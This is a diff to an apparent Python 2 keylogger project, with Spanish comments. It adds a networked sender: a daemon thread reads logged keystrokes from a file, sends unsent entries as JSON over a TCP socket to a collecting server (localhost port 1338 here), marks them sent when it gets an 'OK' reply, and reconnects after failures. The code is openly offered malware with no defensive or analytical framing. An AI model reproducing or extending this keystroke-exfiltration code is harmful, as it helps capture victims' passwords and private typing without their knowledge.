@@ -2,12 +2,7 @@ from keylogger import log
 import time
 import threading
 import json
-def logKeys(t, modifiers, keys):
-    print "%.2f   %r   %r" % (t, keys, modifiers)
-
-#now = time()
-#done = lambda: time() > now + 60
-#log(done,logKeys)
+import socket
 
 class Keylogger(threading.Thread):
     
@@ -39,6 +34,7 @@ class Daemon(threading.Thread):
         self.port = port
         self.timeSleep = timeSleep
         self.files = files
+        self.make_cliente()
         threading.Thread.__init__(self,**kw)
 
     def run(self):
@@ -47,7 +43,7 @@ class Daemon(threading.Thread):
             print "leeeeeeeee_____________"
 
             self.files.lock.acquire()
-
+            self.files.fileR.seek(0)
             read = self.files.fileR.read()
             infoKeys = json.loads('['+read[:-1]+']')
 
@@ -56,22 +52,42 @@ class Daemon(threading.Thread):
                 if i.get('send',True) == False:
                     toSend.append(i) 
                     i['send'] = True
-
+            
+            save = read
             if self._send_data(toSend):
-                print "ENVIADOOOOOOO",toSend
+                save = read.replace('false','true')
+                self.files.fileW.seek(0)
+                self.files.fileW.truncate()
+                self.files.fileW.write(save)
+                self.files.fileW.flush()      
             else:
-                self.files.fileW.write(read)
-                self.files.fileW.flush()        
+                pass
+                #como esta
 
             self.files.lock.release()
-        
+
+    def make_cliente(self):
+        socket_client = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+        try:
+            socket_client.connect(("127.0.0.1",1338))
+        except:
+            pass#no online
+
+        self.socket_client = socket_client
 
     def _send_data(self,keys):
-        t = open('temporalSend.txt','w+')
-        t.write(json.dumps(keys))
-        t.close()
         #si lo envio!
-        return True
+        res = False
+        try:
+            self.socket_client.send(json.dumps(keys))
+            res = self.socket_client.recv(1000)
+        except:
+            self.make_cliente()#try reconect
+
+        if res == 'OK':
+            print "ENVIADO BIEN"
+            return True
+        return False
 
 class FileWR(object):
     
